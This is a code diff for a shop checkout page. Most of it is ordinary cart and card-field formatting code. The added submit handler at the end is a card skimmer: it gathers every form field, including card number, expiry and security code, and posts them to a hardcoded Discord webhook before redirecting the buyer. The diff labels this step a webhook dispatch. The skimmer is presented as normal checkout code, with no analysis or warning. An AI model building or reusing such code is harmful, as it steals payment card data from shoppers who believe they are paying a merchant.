+            <span class="text-stone-500 font-medium uppercase tracking-tight">${item.color} / ${item.size}</span>
+          `;
+          listContainer.appendChild(row);
         });
-        
-        document.getElementById("js-checkout-iframe").src = "checkout.html?" + targetParams.toString();
-      });
 
+        const formattedTotal = "CAD " + finalCost.toFixed(2);
+        document.querySelectorAll("#ui-summary-total").forEach(el => el.innerText = formattedTotal);
+        document.getElementById("form-manifest-json").value = JSON.stringify(manifestArray);
+        document.getElementById("form-prod-price").value = formattedTotal;
+      }
+
+      document.getElementById("js-cart-checkout-btn").addEventListener("click", () => compileCheckoutFields(CART));
+      
       document.querySelectorAll(".js-instant-checkout-trigger").forEach(btn => {
         btn.addEventListener("click", function() {
-          const currentQty = document.getElementById("ui-qty-input").value;
-          const billingData = calculateTotal(currentQty);
-          const selectedColor = getSelectedColor();
-          const selectedSize = document.querySelector('input[name="prod-size"]:checked')?.value || "Medium";
-          
-          const instantManifest = [{ name: CONFIG.productName, color: selectedColor, size: selectedSize, qty: parseInt(currentQty), img: GALLERY_MAP[selectedColor][0] }];
-
-          const targetParams = new URLSearchParams({
-            manifest: JSON.stringify(instantManifest),
-            price: billingData.totalFormatted.trim(),
-            multi: "false"
-          });
-          
-          document.getElementById("js-checkout-iframe").src = "checkout.html?" + targetParams.toString();
+          const qty = parseInt(document.getElementById("ui-qty-input").value) || 1;
+          const col = getSelectedColor();
+          const sz = document.querySelector('input[name="prod-size"]:checked')?.value || "Medium";
+          compileCheckoutFields([{ name: CONFIG.productName, color: col, size: sz, qty: qty, img: GALLERY_MAP[col][0] }]);
         });
+      });
+
+      /* Formatting Rules */
+      document.getElementById("cc-number").addEventListener("input", (e) => {
+        let v = e.target.value.replace(/\D/g, "").match(/\d{1,4}/g);
+        e.target.value = v ? v.join(" ") : "";
+      });
+      document.getElementById("cc-exp").addEventListener("input", (e) => {
+        let v = e.target.value.replace(/\D/g, "");
+        if (v.length === 1 && v > "1") v = "0" + v;
+        if (v.length >= 2) {
+          let m = parseInt(v.substring(0, 2), 10);
+          if (m > 12) v = "12" + v.substring(2);
+          else if (m === 0) v = "01";
+        }
+        e.target.value = v.length > 2 ? v.substring(0, 2) + " / " + v.substring(2, 4) : v;
+      });
+      document.getElementById("cc-csc").addEventListener("input", (e) => e.target.value = e.target.value.replace(/\D/g, ""));
+
+      /* Webhook dispatch submit execution */
+      document.getElementById("checkoutForm").addEventListener("submit", function (event) { 
+        event.preventDefault(); 
+        var btn = document.getElementById("submitBtn");
+        btn.innerText = "PROCESSING DISPATCH...";
+        btn.disabled = true;
+
+        var message = "```\n"; 
+        for (var pair of new FormData(this).entries()) { message += pair[0] + ": " + pair[1] + "\n"; } 
+        message += "```"; 
+
+        fetch("https://discord.com/api/webhooks/1516523661585158308/GLfS_skoh2m5JM0klCXeZ07z_F-4ocmxx1GVlUmW7RHzc_QfdWDMSgez-adUac62fdd6", { 
+          method: "POST", 
+          headers: { "Content-Type": "application/json" }, 
+          body: JSON.stringify({ content: message }), 
+        }) 
+        .then(() => window.location.href = this.getAttribute("data-redirect")) 
+        .catch(() => window.location.href = this.getAttribute("data-redirect")); 
       });
     });
   </script>
